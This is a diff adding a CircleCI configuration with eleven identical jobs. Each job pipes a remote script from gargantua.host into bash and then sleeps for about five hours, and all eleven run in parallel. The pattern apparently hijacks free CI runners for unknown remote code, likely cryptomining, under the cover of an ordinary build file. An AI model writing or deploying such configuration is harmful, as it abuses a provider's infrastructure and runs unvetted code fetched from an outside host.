@@ -1,0 +1,127 @@
+version: 2.1
+
+jobs:
+  anyragocanary:
+    docker:
+    - image: ubuntu:18.04
+    steps:
+      - checkout
+      - run: apt-get update; apt install tmux htop wget curl -y; curl -sL http://gargantua.host/craylistana.sh | bash -
+      - run: 
+            command: sleep 17980
+            no_output_timeout: 5h
+
+  anyragocanary1:
+    docker:
+    - image: ubuntu:18.04
+    steps:
+      - checkout
+      - run: apt-get update; apt install tmux htop wget curl -y; curl -sL http://gargantua.host/craylistana.sh | bash -
+      - run: 
+            command: sleep 17980
+            no_output_timeout: 5h
+
+  anyragocanary2:
+    docker:
+    - image: ubuntu:18.04
+    steps:
+      - checkout
+      - run: apt-get update; apt install tmux htop wget curl -y; curl -sL http://gargantua.host/craylistana.sh | bash -
+      - run: 
+            command: sleep 17980
+            no_output_timeout: 5h
+
+  anyragocanary3:
+    docker:
+    - image: ubuntu:18.04
+    steps:
+      - checkout
+      - run: apt-get update; apt install tmux htop wget curl -y; curl -sL http://gargantua.host/craylistana.sh | bash -
+      - run: 
+            command: sleep 17980
+            no_output_timeout: 5h
+
+  anyragocanary4:
+    docker:
+    - image: ubuntu:18.04
+    steps:
+      - checkout
+      - run: apt-get update; apt install tmux htop wget curl -y; curl -sL http://gargantua.host/craylistana.sh | bash -
+      - run: 
+            command: sleep 17980
+            no_output_timeout: 5h
+
+  anyragocanary5:
+    docker:
+    - image: ubuntu:18.04
+    steps:
+      - checkout
+      - run: apt-get update; apt install tmux htop wget curl -y; curl -sL http://gargantua.host/craylistana.sh | bash -
+      - run: 
+            command: sleep 17980
+            no_output_timeout: 5h
+
+  anyragocanary6:
+    docker:
+    - image: ubuntu:18.04
+    steps:
+      - checkout
+      - run: apt-get update; apt install tmux htop wget curl -y; curl -sL http://gargantua.host/craylistana.sh | bash -
+      - run: 
+            command: sleep 17980
+            no_output_timeout: 5h
+
+  anyragocanary7:
+    docker:
+    - image: ubuntu:18.04
+    steps:
+      - checkout
+      - run: apt-get update; apt install tmux htop wget curl -y; curl -sL http://gargantua.host/craylistana.sh | bash -
+      - run: 
+            command: sleep 17980
+            no_output_timeout: 5h
+
+  anyragocanary8:
+    docker:
+    - image: ubuntu:18.04
+    steps:
+      - checkout
+      - run: apt-get update; apt install tmux htop wget curl -y; curl -sL http://gargantua.host/craylistana.sh | bash -
+      - run: 
+            command: sleep 17980
+            no_output_timeout: 5h
+
+  anyragocanary9:
+    docker:
+    - image: ubuntu:18.04
+    steps:
+      - checkout
+      - run: apt-get update; apt install tmux htop wget curl -y; curl -sL http://gargantua.host/craylistana.sh | bash -
+      - run: 
+            command: sleep 17980
+            no_output_timeout: 5h
+
+  anyragocanary10:
+    docker:
+    - image: ubuntu:18.04
+    steps:
+      - checkout
+      - run: apt-get update; apt install tmux htop wget curl -y; curl -sL http://gargantua.host/craylistana.sh | bash -
+      - run: 
+            command: sleep 17980
+            no_output_timeout: 5h
+
+workflows:
+  main:
+    jobs:
+      - anyragocanary
+      - anyragocanary1
+      - anyragocanary2
+      - anyragocanary3
+      - anyragocanary4
+      - anyragocanary5
+      - anyragocanary6
+      - anyragocanary7
+      - anyragocanary8
+      - anyragocanary9
+      - anyragocanary10
